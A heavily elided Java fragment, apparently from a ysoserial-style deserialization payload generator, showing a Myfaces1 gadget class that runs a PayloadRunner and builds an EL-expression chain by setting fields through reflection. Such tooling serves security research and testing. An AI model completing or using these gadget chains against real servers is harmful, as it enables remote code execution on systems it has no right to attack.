...
//        PayloadRunner.run(Myfaces1.class, args);
        ...
        sinksHelper.setSink(Myfaces1.class.getAnnotation(Sink.class).value()[0]);
        ...
        PayloadRunner.run(Myfaces1.class, args, sinksHelper);
    }
    ...
    public Object getChain(String expr) throws Exception {
        ...
        Reflections.setFieldValue(fc, "_elContext", elContext);
